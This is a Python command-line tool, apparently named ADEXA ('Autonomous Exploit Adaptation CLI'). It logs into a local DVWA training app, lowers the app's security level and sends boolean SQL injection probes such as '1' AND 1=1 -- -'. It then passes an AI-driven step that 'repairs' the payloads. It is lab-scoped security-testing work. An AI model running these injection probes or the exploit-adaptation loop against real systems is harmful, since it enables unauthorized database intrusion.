import argparse
import json
import subprocess
import tempfile
import importlib.util
import shutil
import urllib.request
from pathlib import Path
from urllib.parse import urlsplit, parse_qsl, urlencode


def split_dvwa_url(url: str):
    parsed = urlsplit(url)

    if not parsed.scheme or not parsed.netloc:
        raise ValueError(
            "URL must include scheme and host, for example: "
            "http://localhost/dvwa/vulnerabilities/sqli/"
        )

    full_path = parsed.path or "/"
    marker = "/vulnerabilities/"
    idx = full_path.find(marker)

    if idx == -1:
        raise ValueError(
            "URL must point to a DVWA vulnerability page, for example: "
            "http://localhost/dvwa/vulnerabilities/sqli/"
        )

    app_prefix = full_path[:idx]
    vuln_path = full_path[idx:]

    base_url = f"{parsed.scheme}://{parsed.netloc}{app_prefix}"
    return base_url, vuln_path, parsed.query


def build_dvwa_poc_spec(
    url: str,
    param: str,
    payload: str,
    method: str,
    username: str,
    password: str,
) -> dict:
    base_url, sqli_path, existing_query = split_dvwa_url(url)

    method = method.upper()
    if method != "GET":
        raise ValueError("This CLI version currently supports DVWA SQLi GET mode only.")

    original_query = dict(parse_qsl(existing_query, keep_blank_values=True))

    def make_query_path(test_value: str) -> str:
        q = dict(original_query)
        q[param] = test_value
        q["Submit"] = "Submit"
        return f"{sqli_path}?{urlencode(q)}"

    baseline_value = "1"
    candidate_value = payload

    # dedicated verification probes
    true_value = "1' AND 1=1 -- -"
    false_value = "1' AND 1=2 -- -"

    spec = {
        "name": "ADEXA CLI DVWA SQLi candidate run",
        "base_url": base_url,
        "timeout": 20,
        "adexa_cli": {
            "param": param,
            "baseline_value": baseline_value,
            "starting_payload": candidate_value,
            "candidate_step": "sqli_candidate",
            "baseline_step": "sqli_baseline",
            "true_step": "sqli_true",
            "false_step": "sqli_false",
            "suggested_true_payload": true_value,
            "suggested_false_payload": false_value,
        },
        "steps": [
            {
                "id": "get_login",
                "name": "GET login page (fetch user_token if present)",
                "method": "GET",
                "path": "/login.php",
                "headers": {}
            },
            {
                "id": "login",
                "name": "POST login (username/password + user_token if required)",
                "method": "POST",
                "path": "/login.php",
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "body": (
                    f"username={username}"
                    f"&password={password}"
                    f"&Login=Login"
                    f"&user_token={{{{user_token}}}}"
                )
            },
            {
                "id": "home_check",
                "name": "Verify authenticated session",
                "method": "GET",
                "path": "/",
                "headers": {}
            },
            {
                "id": "get_security",
                "name": "GET security page",
                "method": "GET",
                "path": "/security.php",
                "headers": {}
            },
            {
                "id": "set_security_low",
                "name": "POST security=low",
                "method": "POST",
                "path": "/security.php",
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "body": "security=low&seclev_submit=Submit&user_token={{user_token}}"
            },
            {
                "id": "security_check",
                "name": "Confirm security is low",
                "method": "GET",
                "path": "/security.php",
                "headers": {}
            },
            {
                "id": "sqli_page",
                "name": "Open SQLi page",
                "method": "GET",
                "path": sqli_path,
                "headers": {}
            },
            {
                "id": "sqli_baseline",
                "name": f"SQLi baseline request ({param}={baseline_value})",
                "method": "GET",
                "path": make_query_path(baseline_value),
                "headers": {}
            },
            {
                "id": "sqli_candidate",
                "name": f"Candidate payload ({param}={candidate_value})",
                "method": "GET",
                "path": make_query_path(candidate_value),
                "headers": {}
            },
            {
                "id": "sqli_true",
                "name": f"Boolean TRUE comparator ({param}={true_value})",
                "method": "GET",
                "path": make_query_path(true_value),
                "headers": {}
            },
            {
                "id": "sqli_false",
                "name": f"Boolean FALSE comparator ({param}={false_value})",
                "method": "GET",
                "path": make_query_path(false_value),
                "headers": {}
            }
        ],
        "success": {
            "require_security_level": "low",
            "boolean_diff": {
                "baseline_step": "sqli_baseline",
                "true_step": "sqli_true",
                "false_step": "sqli_false"
            }
        }
    }

    return spec



def run_doctor() -> int:
    """Check whether the local ADEXA environment is ready."""
    print()
    print("=" * 50)
    print("             ADEXA DOCTOR")
    print("=" * 50)
    print()

    checks = []

    # Python
    python_ok = True
    version = f"{__import__('sys').version_info.major}.{__import__('sys').version_info.minor}"
    print(f"✓ Python {version}")
    checks.append(python_ok)

    # Python dependencies
    dependencies_ok = True
    for package in ("requests", "flask"):
        if importlib.util.find_spec(package) is None:
            print(f"✗ Python dependency missing: {package}")
            dependencies_ok = False
    if dependencies_ok:
        print("✓ Python dependencies")
    checks.append(dependencies_ok)

    # Docker
    docker_path = shutil.which("docker")
    if not docker_path:
        print("✗ Docker not found")
        checks.append(False)
    else:
        result = subprocess.run(
            ["docker", "info"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=False,
        )
        if result.returncode == 0:
            print("✓ Docker is running")
            checks.append(True)
        else:
            print("✗ Docker is installed but not running")
            checks.append(False)

    # Docker Compose
    compose_result = subprocess.run(
        ["docker", "compose", "version"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )
    if compose_result.returncode == 0:
        print("✓ Docker Compose")
        checks.append(True)
    else:
        print("✗ Docker Compose not available")
        checks.append(False)

    # Required local files
    required_files = [
        "compose.yml",
        "scripts/setup_dvwa.sh",
        "setup.sh",
        "main.py",
    ]

    files_ok = all(Path(f).exists() for f in required_files)

    if files_ok:
        print("✓ ADEXA setup files")
    else:
        print("✗ ADEXA setup files missing")
        for f in required_files:
            if not Path(f).exists():
                print(f"  Missing: {f}")
    checks.append(files_ok)

    # DVWA connectivity
    dvwa_url = "http://127.0.0.1:4280/login.php"

    try:
        with urllib.request.urlopen(dvwa_url, timeout=5) as response:
            if response.status < 500:
                print("✓ DVWA is reachable")
                checks.append(True)
            else:
                print("✗ DVWA returned an error")
                checks.append(False)
    except Exception:
        print("✗ DVWA is not reachable")
        checks.append(False)

    print()
    print("-" * 50)

    if all(checks):
        print("✓ ADEXA environment is ready.")
        print("-" * 50)
        return 0

    print("✗ ADEXA environment needs attention.")
    print("Run ./setup.sh if you have not completed setup.")
    print("-" * 50)
    return 1


def run_demo() -> int:
    """Run a simple authorized local DVWA demonstration."""
    import re

    demo_url = "http://127.0.0.1:4280/vulnerabilities/sqli/"
    demo_param = "id"
    demo_payload = "'"

    print()
    print("=" * 50)
    print("                 ADEXA DEMO")
    print("=" * 50)
    print()
    print(f"Target:    {demo_url}")
    print("Method:    GET")
    print(f"Parameter: {demo_param}")
    print("Test:      SQL Injection")
    print()
    print("[1] TEST")
    print(f"    Payload: {demo_payload}")

    result = subprocess.run(
        [
            __import__("sys").executable,
            __file__,
            "--url",
            demo_url,
            "--param",
            demo_param,
            "--payload",
            demo_payload,
            "--method",
            "GET",
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        check=False,
    )

    output = result.stdout

    fixed_match = re.search(
        r"\[ADEXA\] Selected Payload: (.+)",
        output
    )

    decision_match = re.search(
        r"\[ADEXA\] AI Decision: (.+)",
        output
    )

    verified = (
        "Status: Success" in output
        and "Verified: Yes" in output
    )

    fixed_payload = fixed_match.group(1).strip() if fixed_match else "Unknown"

    print()
    print("[2] ANALYZE")
    if decision_match:
        decision = decision_match.group(1).strip()
        print(f"    {decision}")
    else:
        print("    Failure analyzed")

    print()
    print("[3] REPAIR")
    print(f"    Original: {demo_payload}")
    print(f"    Fixed:    {fixed_payload}")

    print()
    print("[4] VERIFY")
    if verified:
        print("    ✓ Fixed payload verified")
    else:
        print("    ✗ Fixed payload could not be verified")

    print()
    print("-" * 50)
    if verified:
        print("Result: SUCCESS")
        print("ADEXA successfully repaired the SQLi test.")
    else:
        print("Result: FAILED")
        print("ADEXA could not verify the repair.")
    print("-" * 50)
    print()

    return result.returncode

def main() -> None:
    parser = argparse.ArgumentParser(
        description="ADEXA - Autonomous Exploit Adaptation CLI"
    )

    parser.add_argument("--url", help="Target DVWA SQLi URL")
    parser.add_argument("--param", help="Parameter to inject")
    parser.add_argument("--payload", help="Starting candidate payload")
    parser.add_argument("--method", default="GET", help="HTTP method (default: GET)")
    parser.add_argument("--mode", default="web", help="Execution mode (default: web)")
    parser.add_argument("--username", default="admin", help="DVWA username (default: admin)")
    parser.add_argument("--password", default="password", help="DVWA password (default: password)")

    parser.add_argument(
        "command",
        nargs="?",
        choices=["doctor", "demo"],
        help="Run an ADEXA health check or local demonstration"
    )

    args = parser.parse_args()

    if args.command == "doctor":
        raise SystemExit(run_doctor())

    if args.command == "demo":
        raise SystemExit(run_demo())

    guided_mode = not args.url and not args.param and not args.payload

    if guided_mode:
        print()
        print("=" * 50)
        print("        ADEXA SECURITY TESTING")
        print("=" * 50)
        print()
        print("Configure an authorized DVWA security test.")
        print()

        args.url = input("Target URL: ").strip()

        if not args.url:
            parser.error("Target URL cannot be empty.")

        args.param = input("Parameter [id]: ").strip() or "id"
        args.payload = input("Initial payload [']: ").strip() or "'"
        args.method = input("HTTP method [GET]: ").strip().upper() or "GET"

        print()
        print("-" * 50)
        print("ADEXA TEST CONFIGURATION")
        print("-" * 50)
        print(f"Target:    {args.url}")
        print(f"Parameter: {args.param}")
        print(f"Payload:   {args.payload}")
        print(f"Method:    {args.method}")
        print("-" * 50)
        print()

        confirmation = input(
            "Start authorized security test? [Y/n]: "
        ).strip().lower()

        if confirmation not in ("", "y", "yes"):
            print("[ADEXA CLI] Test cancelled.")
            return

    if not args.url:
        parser.error("--url is required.")

    if not args.param:
        parser.error("--param is required.")

    if not args.payload:
        parser.error("--payload is required.")

    if args.method.upper() != "GET":
        parser.error("This CLI currently supports DVWA SQLi GET mode only.")

    if not guided_mode:
        print()
        print(f"[ADEXA CLI] Target: {args.url}")
        print(f"[ADEXA CLI] Parameter: {args.param}")
        print(f"[ADEXA CLI] Candidate payload: {args.payload}")
        print(f"[ADEXA CLI] Method: {args.method.upper()}")
        print(f"[ADEXA CLI] Mode: {args.mode}")
        print(f"[ADEXA CLI] Username: {args.username}")

    try:
        spec = build_dvwa_poc_spec(
            url=args.url,
            param=args.param,
            payload=args.payload,
            method=args.method,
            username=args.username,
            password=args.password,
        )
    except ValueError as exc:
        parser.error(str(exc))

    if not guided_mode:
        print(f"[ADEXA CLI] base_url: {spec['base_url']}")

    with tempfile.NamedTemporaryFile(
        mode="w",
        delete=False,
        suffix=".json",
        encoding="utf-8"
    ) as f:
        json.dump(spec, f, indent=2)
        spec_path = f.name

    if not guided_mode:
        print(f"[ADEXA CLI] Generated PoC spec: {spec_path}")

    if guided_mode:
        result = subprocess.run(
            ["python3", "main.py", spec_path, args.mode],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            check=False,
        )

        output = result.stdout

        import re

        fixed_match = re.search(
            r"\[ADEXA\] Selected Payload: (.+)",
            output
        )

        verified = (
            "Status: Success" in output
            and "Verified: Yes" in output
        )

        fixed_payload = (
            fixed_match.group(1).strip()
            if fixed_match
            else "Unknown"
        )

        print()
        print("Testing...")
        print()
        print("SQL Injection")
        print(f"Original: {args.payload}")
        print(f"Fixed:    {fixed_payload}")
        print()
        print("✓ Repair verified" if verified else "✗ Repair could not be verified")
        print()
        print("Result: SUCCESS" if verified else "Result: FAILED")

    else:
        subprocess.run(
            ["python3", "main.py", spec_path, args.mode],
            check=False
        )


if __name__ == "__main__":
    main()
